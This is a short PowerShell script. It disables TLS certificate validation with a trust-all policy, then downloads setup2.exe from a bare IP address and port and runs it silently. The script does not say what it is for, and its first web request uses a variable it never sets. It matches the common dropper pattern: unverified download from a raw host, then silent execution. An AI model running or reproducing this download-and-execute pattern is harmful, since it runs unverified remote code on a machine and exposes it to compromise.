add-type @"
    using System.Net;
    using System.Security.Cryptography.X509Certificates;
    public class TrustAllCertsPolicy : ICertificatePolicy {
        public bool CheckValidationResult(
            ServicePoint srvPoint, X509Certificate certificate,
            WebRequest request, int certificateProblem) {
            return true;
        }
    }
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy

$URI = New-Object "System.URIbuilder" $URL
[system.Net.Webrequest]$request = [system.Net.Webrequest]::Create($uri.uri)
[system.Net.Webresponse]$response = $request.GetResponse()
[System.IO.Stream]$str = $response.GetResponseStream()
[System.IO.StreamReader]$reader = New-Object "System.IO.Streamreader" $str
$result = $reader.ReadToEnd()
$url = "https://169.57.35.181:2015/setup2.exe"
$outfile = "c:\setup2.exe"
Invoke-WebRequest $url -outfile $outfile
start-Process -Wait -FilePath $outfile -ArgumentList '/s'

